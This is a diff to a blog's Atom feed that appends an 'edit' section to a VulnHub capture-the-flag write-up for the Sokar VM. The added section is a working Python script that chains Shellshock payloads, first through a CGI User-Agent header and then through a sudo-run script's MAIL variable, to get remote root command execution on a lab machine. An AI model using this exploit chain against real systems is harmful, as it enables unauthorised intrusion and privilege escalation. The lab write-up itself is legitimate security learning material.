@@ -4,7 +4,7 @@
   <title><![CDATA[#!/slash/note]]></title>
   <link href="http://leonjza.github.io/atom.xml" rel="self"/>
   <link href="http://leonjza.github.io/"/>
-  <updated>2015-02-22T09:17:24+02:00</updated>
+  <updated>2015-02-23T07:28:58+02:00</updated>
   <id>http://leonjza.github.io/</id>
   <author>
     <name><![CDATA[Leon Jacobs]]></name>
@@ -1724,6 +1724,71 @@ Running it asked you if you wanted to &lsquo;build?&rsquo;:</p>
 </span><span class='line'>COMMIT
 </span></code></pre></td></tr></table></div></figure>
 
+
+<h2>edit</h2>
+
+<p>I have been wondering if it was possible to get complete remote root command execution using the sample python scripts used for apophis and bynarr. Well, turns out the <code>lime</code> script run with <code>sudo</code> can be shocked too!</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># 2015 Leon Jacobs</span>
+</span><span class='line'><span class="c"># sokar remote root command execution</span>
+</span><span class='line'>
+</span><span class='line'><span class="kn">import</span> <span class="nn">requests</span>
+</span><span class='line'><span class="kn">import</span> <span class="nn">sys</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="k">print</span> <span class="s">&quot; * Usage </span><span class="si">%s</span><span class="s"> &lt;cmd&gt;&quot;</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
+</span><span class='line'>    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Grab the command from the args</span>
+</span><span class='line'><span class="n">command</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># prep to shock the lime script</span>
+</span><span class='line'><span class="n">root_command</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;echo &quot;N&quot; | sudo MAIL=</span><span class="se">\\</span><span class="s">&quot;() { :;}; </span><span class="si">%s</span><span class="s">;</span><span class="se">\\</span><span class="s">&quot; /home/bynarr/lime&quot;&quot;&quot;</span> <span class="o">%</span> <span class="n">command</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># prep to exec the command as bynarr</span>
+</span><span class='line'><span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;&quot;/usr/bin/python -c &quot;import time; time.sleep(1); print &#39;fruity&#39;&quot; | /usr/bin/python -c &quot;import pty; pty.spawn([&#39;/bin/su&#39;,&#39;-c&#39;,&#39;</span><span class="si">%s</span><span class="s">&#39;, &#39;bynarr&#39;]);&quot; &quot;&quot;&quot;</span> <span class="o">%</span> <span class="n">root_command</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># be verbose about the full command</span>
+</span><span class='line'><span class="k">print</span> <span class="s">&quot; * Executing </span><span class="si">%s</span><span class="se">\n</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">payload</span>
+</span><span class='line'>
+</span><span class='line'><span class="c"># Send the sploit</span>
+</span><span class='line'><span class="n">headers</span> <span class="o">=</span> <span class="p">{</span> <span class="s">&quot;User-Agent&quot;</span><span class="p">:</span> <span class="s">&quot;() { :;};echo;</span><span class="si">%s</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">payload</span> <span class="p">}</span>
+</span><span class='line'><span class="k">print</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s">&quot;http://192.168.217.163:591/cgi-bin/cat&quot;</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">)</span><span class="o">.</span><span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Run with <code>python root.py "/bin/cat /root/flag"</code> :D</p>
 
 <p>Thanks to <a href="https://twitter.com/_RastaMouse">@_RastaMouse</a> for the VM, and as always, <a href="https://twitter.com/VulnHub">@VulnHub</a> for the hosting and great community!</p>
 ]]></content>
